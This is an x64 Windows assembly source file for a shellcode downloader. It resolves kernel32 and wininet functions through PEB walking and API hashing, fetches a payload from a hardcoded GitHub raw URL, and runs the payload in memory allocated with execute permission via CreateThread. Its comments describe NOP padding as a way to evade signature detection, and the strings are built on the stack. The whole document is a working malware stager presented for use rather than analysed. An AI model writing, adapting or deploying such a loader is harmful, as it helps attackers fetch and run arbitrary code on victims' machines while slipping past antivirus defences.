;nasm -fwin64 [x64findkernel32.asm]
;x86_64-w64-mingw32-gcc downloader.obj -o downloader.exe
; or
; ld.exe -m i386pep -N -o downloader.exe downloader.obj

BITS 64

SECTION .data
SECTION .bss

section .text
global main
main:
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi,[rax+0x10]       ;PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]      ;kernel32.dll base address
mov r8, rbx              ; mov kernel32.dll base addr into r8
;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA
mov r13, r11                  ; Save for later
mov rcx, r10                  ; Set loop counter
kernel32findfunction:             ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
    jmp hashinitiator
FunctionNameNotFound:
jmp continuation
FunctionNameFound:                ; Get function address from AddressOfFunctions
   inc ecx                        ; increase counter by 1 to account for decrement in loop
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov r15d, [r11+rcx*4]          ; Get the function RVA.
   add r15, r8                    ; Found the Api! w00t!
   push r15 
   mov r11, r13
   dec ecx
   jmp kernel32findfunction

   hashinitiator:
       xor eax, eax
       mov rsi, rbx
       xor rbx, rbx
   next_char:
       mov bl, [rsi]       ; load next char
       test bl, bl
       jz check_hash
       rol eax, 5          ; rotate hash left 5 bits
       xor eax, ebx        ; hash ^= char
       inc rsi
       jmp next_char
   
   check_hash:
   cmp eax, 0x80778D35                        ; Compare all bytes
   je FunctionNameFound               ; If match, function found
   cmp eax, 0x4A155ACA                 ; R9 = "our API"
   je FunctionNameFound               ; If match, function found
   cmp eax, 0x85B79578
   je FunctionNameFound
   cmp eax, 0xB68D8A33
   je FunctionNameFound
   cmp eax, 0xC7DEFE95
   je FunctionNameFound
   cmp eax, 0xA4A1011B
   je FunctionNameFound
   cmp eax, 0xE536B693
   je FunctionNameFound
   cmp eax, 0xE3DB70A7
   je FunctionNameFound
   cmp eax, 0xCEFC5AFD
   je FunctionNameFound
   cmp eax, 0xD7277164
   je FunctionNameFound
   
   jmp kernel32findfunction
   
continuation:

; --- How to access - Example: using API1 ---
;mov rax, [rsp + 0*8]
;call rax

; --- Example: using API5 (LoadLibraryA) ---
;mov rax, [rsp + 4*8]
;call rax

;locate wininet.dll
    mov rax, 0x9074656E696E6977     ; Add "wininet" string to RAX.
    shl rax, 0x8
    shr rax, 0x8
    push rax                        ; Push RAX to stack
    mov rcx, rsp                    ; Move a pointer to User32.dll into RCX.
    sub rsp, 0x28                   ; stack alignment
    mov rax, [rsp + 10*8]
    call rax                        ; Call LoadLibraryA("wininet.dll")
    add rsp, 0x30                   ; stack alignment
    mov rdi, rax                    ; holds wininet.dll address

; Prepare arguments for GetProcAddress to locate InternetOpenA
    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    mov rax, 0x909090416E65704F         ; Load "OpenA" into RAX
    shl rax, 0x18                    ; 0000000041786F00
    shr rax, 0x18                    ; 000000000041786F
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetOpenA" (second argument)
    sub rsp, 0x30
    mov rax, [rsp + 11*8]
    mov rsi, rax                   ; save GetProcAddress for later
    call rax                       ; Call GetProcAddress
    add rsp, 0x30
    mov r15, rax                    ; store InternetOpenA    

;rdi = wininet.dll
;r15 = InternetOpenA

 ;Prepare arguments for GetProcAddress to locate InternetOpenUrlA
    xor rax, rax
    push rax
    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    mov rax, 0x416C72556E65704F         ; Load "OpenUrlA" into RAX
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetOpenUrlA" (second argument)
    sub rsp, 0x38
    call rsi              ; Call GetProcAddress
    add rsp, 0x30
    mov r14, rax                    ; store InternetOpenUrlA    

; Prepare arguments for GetProcAddress to locate InternetReadFile
    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    xor rax, rax 
    push rax
    mov rax, 0x656C694664616552         ; Load "ReadFile" into RAX
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetReadFile" (second argument)
    sub rsp, 0x38
    call rsi                        ; Call GetProcAddress
    add rsp, 0x30
    mov r13, rax                    ; store InternetReadFile    

; Prepare arguments for GetProcAddress to locate InternetCloseHandle
    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    mov eax, 0x90656C64
    shl eax, 0x8
    shr eax, 0x8
    push rax
    mov rax, 0x6E614865736F6C43         ; Load "CloseHan" into RAX
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetCloseHandle" (second argument)
    sub rsp, 0x38
    call rsi              ; Call GetProcAddress
    add rsp, 0x30
    mov r12, rax                    ; store InternetCloseHandle    

; ---- InternetOpenA ----
    xor rdx, rdx
    mov eax, 0x90302E35
    shl eax, 0x8
    shr eax, 0x8
    push rax
    mov rax, 0x2F616C6C697A6F4D
    push rax
    mov rcx, rsp             ; lpszAgent
    mov edx, 1               ; INTERNET_OPEN_TYPE_DIRECT
    xor r8, r8               ; lpszProxy
    xor r9, r9               ; lpszProxyBypass
    mov qword [rsp+0x20], 0  ; dwFlags
    sub rsp, 0x30
    call r15                 ; InternetOpenA
    add rsp, 0x30
    mov rdi, rax                 ; hInternet saved handle

; ---- Allocate memory for the saved file/buffer ----
    mov rcx, 0                    ; LPVOID lpAddress = NULL
    mov rdx, 0x5000               ; SIZE_T dwSize = 20 KB for shellcode
    mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x04                 ; PAGE_READWRITE temporarily
    add rsp, 96
    mov rax, [rsp+80]
    mov rsi, rax                  ; save to call again :)
    call rax
    ;sub rsp, 96
    ;sub rsp, 8
    pop r15        ; buffer memory address for downloaded file/shellcode

; --- Allocate memory for the long ass URL because other ways didn't work --- 

    mov rcx, 0                    ; LPVOID lpAddress = NULL
    mov rdx, 0x100               ; SIZE_T dwSize = 100 for URL
    mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x04                 ; PAGE_READWRITE temporarily
    mov rax, rsi                  ; save to call again :)
    call rax
    push rax

    mov r9, [rsp+72]              ;rtlmovememory



    pop rsi                      ;memory address for the long url
; --- transfer URL to new memory region for easier management ---
    sub rsp, 152
    mov rax, 0x906F6E79642E6765
    shl rax, 0x8
    shr rax, 0x8
    push rax
    mov rax, 0x722F6E69616D2F73
    push rax
    mov rax, 0x646165682F736665
    push rax
    mov rax, 0x722F7761722F7261
    push rax
    mov rax, 0x6461726568747265
    push rax
    mov rax, 0x646E752F6D337473
    push rax
    mov rax, 0x79737433672F6D6F
    push rax
    mov rax, 0x632E627568746967
    push rax
    mov rax, 0x2F2F3a7370747468
    push rax
    mov r8,rsp

;rtlmovememory
    mov rcx, rsi ; address for new memory region
    mov rdx, r8               ; source
    xor r8, r8
    mov r8d, 71                      ; size
    ;call RtlMoveMemory
    call r9

    add rsp, 88

 ; ---- InternetOpenUrlA ----
    mov rcx, rdi                     ; hInternet
    mov rdx, rsi                 ; lpszUrl
    xor r8d, r8d                       ; lpszHeaders
    xor r9d, r9d                       ; dwHeadersLength
    mov dword [rsp+0x20], 0x4000000    ; dwFlags
    mov qword [rsp+0x28],0             ; dwContext
    call r14
    add rsp, 0x28
    push rax                       ; hUrl
    mov rsi, [rsp]                 ; hUrl handle for closing
	
	xor rbx, rbx
read_loop:
    ; ---- InternetReadFile ----
    mov rcx, [rsp]                   ; HINTERNET hUrl
    lea rdx, [r15 + rbx]             ; LPVOID lpBuffer + offset
    mov r8d, 4096                    ; DWORD dwNumberOfBytesToRead
    lea r9, [rsp+0x40]               ; LPDWORD lpdwNumberOfBytesRead
    call r13
    
    test eax, eax                    ; Check if InternetReadFile succeeded
    je read_done
    
    mov ecx, dword [rsp+0x40]        ; Bytes read THIS iteration
    test ecx, ecx                    ; Check if 0 bytes (EOF)
    jz read_done
    
    add rbx, rcx                     ; Accumulate total bytes
    jmp read_loop
    
read_done:
    mov [rsp-0x50], ebx              ; Store total bytes downloaded
	
    ; ---- Close handles ----
    mov rcx, rsi                     ; hUrl
    call r12
    mov rcx, rdi                     ; hInternet
    call r12

; ---- Allocate memory ----
    mov rcx, 0                    ; LPVOID lpAddress = NULL
    mov rdx, 0x10000               ; SIZE_T dwSize = 64 KB for shellcode
    mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x40                 ; PAGE_READWRITE_EXECUTE
    mov rax, [rsp + 22*8]
    call rax
    push rax

; ---- Copy shellcode ----
    ; Normally use memcpy(mem_buffer, chunk, bytesRead) or multiple chunks
    ; Example: single chunk
    pop rcx                      ; destination
    mov rdx, r15                 ; source
    mov r8d, dword [rsp-0x10]    ; size
    mov rax, [rsp + 21*8]
    call rax                     ;RtlMoveMemory
    push rax
    ; ---- Create thread ----
   xor rcx, rcx                ; lpThreadAttributes = NULL
   xor rdx, rdx                ; dwStackSize = 0
   pop r8                      ; rsi (example) holds shellcode pointer
   xor r9, r9                  ; lpParameter = NULL
   mov dword [rsp+0x20], 0     ; dwCreationFlags = 0
   mov qword [rsp+0x28], 0     ; lpThreadId = NULL
   mov rax, [rsp+0x88]         ; rax = pointer to CreateThread
   call rax

    ; ---- Wait for shellcode ----
    mov rcx, rax
    mov rdx, 0xFFFFFFFF            ; INFINITE
    mov rbx, [rsp+25*8]
    call rbx
   ; mov rcx, [rel hThread]
   ; call CloseHandle

    ; ---- Free memory ----
   ; mov rcx, [rel mem_buffer]
   ; mov rdx, 0
   ; mov r8d, 0x8000                ; MEM_RELEASE
   ; call VirtualFree

    ; Exit
    xor ecx, ecx
    mov rax, [rsp + 18*8]
    call rax
